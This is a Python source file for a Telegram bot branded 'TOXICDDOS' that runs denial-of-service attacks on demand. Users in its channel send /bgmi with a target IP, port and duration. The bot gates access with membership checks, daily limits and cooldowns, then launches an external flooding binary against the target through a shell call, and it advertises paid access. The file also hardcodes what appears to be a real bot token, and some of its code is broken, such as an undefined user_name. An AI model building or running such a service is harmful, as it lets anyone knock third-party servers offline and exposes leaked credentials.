import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '7885504979:AAGwRrIWAZNxcd1apzEJKN_X1oUgqqKQ0LI'  # Replace with your actual bot token
ADMIN_IDS = [6882674372]  # Added new admin ID
CHANNEL_ID = '-1002431196846' # Replace with your specific channel or group ID
# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 10  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [5047224084, 1604629264]

# Track active attacks
active_attacks = 0  
MAX_ACTIVE_ATTACKS = 2  # Maximum number of running attacks

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# /start Command 
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(
        message.chat.id,
        "✨🔥 *『 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 TOXICDDOS™ 』* 🔥✨\n\n"
        "🚀 *Hello, Commander!* ⚡\n"
        "🎯 *Get ready to dominate the battlefield!* 🏆\n\n"
        "💀 *𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙨 𝙙𝙚𝙨𝙞𝙜𝙣𝙚𝙙 𝙩𝙤 𝙝𝙚𝙡𝙥 𝙮𝙤𝙪 𝙖𝙩𝙩𝙖𝙘𝙠 & 𝙙𝙚𝙛𝙚𝙣𝙙!* 💀\n\n"
        "⚡ *Use* `/help` *to explore all commands!* 📜"
    )

# /help Command - Stylish Help Menu
@bot.message_handler(commands=['help'])
def show_help(message):
    response = (
        "╔══════════════════════════╗\n"
        "       🌟 *『 TOXICDDOS™ 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔 』* 🌟\n"
        "╚══════════════════════════╝\n\n"
        "💀 *𝙏𝙃𝙀 𝘽𝙀𝙎𝙏 𝘽𝙊𝙏 𝙁𝙊𝙍 𝘿𝙊𝙈𝙄𝙉𝘼𝙏𝙄𝙊𝙉!* 💀\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 *『 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 🚀\n"
        "🎮 `/start` - ✨ *Begin your journey!*\n"
        "📜 `/help` - 🏆 *View this epic menu!*\n"
        "⚡ `/status` - 🚀 *Check your battle status!*\n"
        "✅ `/verify` - 🔓 *Unlock exclusive features!*\n"
        "💀 `/bgmi` - 🎯 *Launch your attack!* *(Verified users only)*\n"
        "📸 *Send a Photo* - 🔥 *Submit feedback!* \n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "💠 *『 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 💠\n"
        "🔄 `/reset_TP` - ⚙️ *Reset attack limits!*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬:* [⚡ TOXICPLAYER002](https://t.me/TOXICPLAYER002) 💀\n"
    )

    response = bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)


# PAPA bgmi_FLASH92
# 🛡️ 『 𝑺𝒕𝒂𝒕𝒖𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 』🛡️
@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_end = user_cooldowns.get(user_id)
    cooldown_time = max(0, (cooldown_end - datetime.now()).seconds) if cooldown_end else 0

    response = (
        "🛡️✨ *『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 』* ✨🛡️\n\n"
        f"👤 *𝙐𝙨𝙚𝙧:* {message.from_user.first_name}\n"
        f"🎯 *𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠𝙨:* `{remaining_attacks}` ⚔️\n"
        f"⏳ *𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙏𝙞𝙢𝙚:* `{cooldown_time} seconds` 🕒\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 𝘼𝙉𝘿 𝙒𝙄𝙉 𝙏𝙃𝙀 𝘽𝘼𝙏𝙏𝙇𝙀!* ⚡"
    )

    response = bot.reply_to(message, response, parse_mode="Markdown")


# 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄
@bot.message_handler(commands=['reset_TP'])
def reset_attack_limit(message):
    owner_id = 6882674372  # Replace with the actual owner ID
    if message.from_user.id != owner_id:
        response = (
            "❌🚫 *ACCESS DENIED!* 🚫❌\n\n"
            "🔒 *𝘠𝘰𝘶 𝘥𝘰 𝘯𝘰𝘵 𝘩𝘢𝘷𝘦 𝘱𝘦𝘳𝘮𝘪𝘴𝘴𝘪𝘰𝘯 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥!* 🔒\n\n"
            "🚀 *𝘖𝘯𝘭𝘺 𝘵𝘩𝘦 𝘉𝘖𝘚𝘚 𝘤𝘢𝘯 𝘦𝘹𝘦𝘤𝘶𝘵𝘦 𝘵𝘩𝘪𝘴!* 💀"
        )
        response = bot.reply_to(message, response, parse_mode="Markdown")
        return
    
    # Reset the attack count
    user_attacks.clear()

    response = (
        "🔄🔥 *『 𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗! 』* 🔥🔄\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "⚙️ *𝗔𝗟𝗟 𝗗𝗔𝗜𝗟𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗥𝗘𝗦𝗘𝗧!* ⚙️\n\n"
        "🚀 *𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝘁𝗮𝗿𝘁 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!* 🚀\n"
        "💀 *𝗣𝗿𝗲𝗽𝗮𝗿𝗲 𝗳𝗼𝗿 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡!* 💀\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬: [TOXICPLAYER002](https://t.me/TOXICPLAYER002) ⚡*"
    )

    response = bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)


# Handler for photos sent by users (feedback received)
# Define the feedback channel ID
FEEDBACK_CHANNEL_ID = "-1002431196846"  # Replace with your actual feedback channel ID

# Store the last feedback photo ID for each user to detect duplicates
last_feedback_photo = {}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id  # Get the latest photo ID

    # Check if the user has sent the same feedback before & give a warning
    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            "⚠️🚨 *『 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞! 』* 🚨⚠️\n\n"
            "🛑 *𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀!* 🛑\n"
            "📩 *𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊.*\n\n"
            "✅ *𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏!*"
        )
        response = bot.reply_to(message, response)

    # ✅ Store the new feedback ID (this ensures future warnings)
    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True  # Mark feedback as given

    # ✅ Stylish Confirmation Message for User
    response = (
        "✨『 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』✨\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        "📩 𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!🎉\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    response = bot.reply_to(message, response)

    # 🔥 Forward the photo to all admins
    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        admin_response = (
            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🛡️\n"
            f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(admin_id, admin_response)

    # 🎯 Forward the photo to the feedback channel
    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
    channel_response = (
        "🌟🎖️ *『 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲! 』* 🎖️🌟\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
        "📸 *𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* 🖼️\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📢 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* 💖"
    )
    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)


# Store verified users
verified_users = set()

# Private channel username (not ID)
PRIVATE_CHANNEL_USERNAME = "APNA_BHAI_DILDOS"  # Example: "MyPrivateChannel"
PRIVATE_CHANNEL_LINK = "https://t.me/APNA_BHAI_DILDOS"  # Replace with actual link

# ✅ Command to verify after joining
@bot.message_handler(commands=['verify'])
def verify_user(message):
    user_id = message.from_user.id
    
    try:
        chat_member = bot.get_chat_member(f"@{PRIVATE_CHANNEL_USERNAME}", user_id)
        if chat_member.status in ["member", "administrator", "creator"]:
            verified_users.add(user_id)
            bot.send_message(
                message.chat.id,
                "✅✨ *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟!* ✨✅\n\n"
                "🎉 𝗪𝗲𝗹𝗰𝗼𝗺𝗲! 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘄 𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗨𝘀𝗲𝗿. 🚀\n"
                "🔗 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗮𝗰𝗰𝗲𝘀𝘀 /bgmi 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀! ⚡️"
            )
        else:
            bot.send_message(
                message.chat.id,
                f"🚨 *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗙𝗔𝗜𝗟𝗘𝗗!* 🚨\n\n"
                f"🔗 [Join our Channel]({PRIVATE_CHANNEL_LINK}) 📩\n"
                "⚠️ 𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝗿𝘂𝗻 /verify 𝗮𝗴𝗮𝗶𝗻.",
                parse_mode="Markdown"
            )
    except Exception:
        bot.send_message(
            message.chat.id,
            f"⚠️ *𝗘𝗿𝗿𝗼𝗿 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽!* ⚠️\n\n"
            f"📌 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗷𝗼𝗶𝗻𝗲𝗱: [Click Here]({PRIVATE_CHANNEL_LINK})",
            parse_mode="Markdown"
        )


# ⚠️ Modify /bgmi to check live membership
@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    user_id = message.from_user.id

    try:
        chat_member = bot.get_chat_member(f"@{PRIVATE_CHANNEL_USERNAME}", user_id)
        if chat_member.status not in ["member", "administrator", "creator"]:
            verified_users.discard(user_id)
            bot.send_message(
                message.chat.id,
                f"🚨 *𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!* 🚨\n\n"
                f"🔗 [Click Here to Rejoin]({PRIVATE_CHANNEL_LINK})\n"
                "📌 𝗧𝗵𝗲𝗻 𝗿𝘂𝗻 /verify 𝗮𝗴𝗮𝗶𝗻 𝘁𝗼 𝗿𝗲𝗴𝗮𝗶𝗻 𝗮𝗰𝗰𝗲𝘀𝘀!",
                parse_mode="Markdown"
            )
            return
    except Exception:
        bot.send_message(
            message.chat.id,
            f"⚠️ *𝗘𝗿𝗿𝗼𝗿 𝗩𝗲𝗿𝗶𝗳𝘆𝗶𝗻𝗴 𝗬𝗼𝘂!* ⚠️\n\n"
            f"📌 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗷𝗼𝗶𝗻𝗲𝗱: [Click Here]({PRIVATE_CHANNEL_LINK})",
            parse_mode="Markdown"
        )
        return

    bot.send_message(
        message.chat.id,
        "✅ *𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!* 🎉\n"
        "🚀 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗮 𝗽𝗮𝗿𝘁 𝗼𝗳 𝘁𝗵𝗲 𝗲𝗹𝗶𝘁𝗲! 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 /bgmi... 🔥"
    )


    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @TOXICPLAYER002 ( TUMHARE_PAPA ) | ]\n\nPAID AVAILABLE DM:- @TOXICPLAYER002")
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if the user is banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 10)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣g 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. Please  𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry

# Check if the number of running attacks is at the limit
    if active_attacks >= MAX_ACTIVE_ATTACKS:
        bot.send_message(
            message.chat.id,
            "⚠️𝗕𝗛𝗔𝗜 𝗦𝗔𝗕𝗥 𝗥𝗔𝗞𝗛𝗢! 𝗔𝗕𝗛𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗘 𝗛𝗔𝗜! 🚀, \n\n ATTACK FINISH HONE DE."
        )
        return

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 10} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 10} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, BHAI APKI AJ KI ATTACK LIMIT HOGYI HAI AB DIRECT KAL ANA  ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, ⚠️💀 DEKH BHAI TU NE FEEDBACK NHI DIYA ISLIYE.\n\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("TOXIC 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ USE THIS 👇⬇️\n/bgmi <IP> <PORT> <DURATION>")

        target_ip, target_port, user_duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("Invalid duration. Must be a positive integer.")

        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 150
        
        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
        
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        bot.send_message(
        message.chat.id,
            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n⚠️𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔⚠️ :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- @{username}\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
        )

        # Log the attack started message
        logging.info(f"Attack started by {user_name}: ./Moin {target_ip} {target_port} {default_duration} 900")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./mrinmoy {target_ip} {target_port} {duration}"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> TOXICDDOS")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")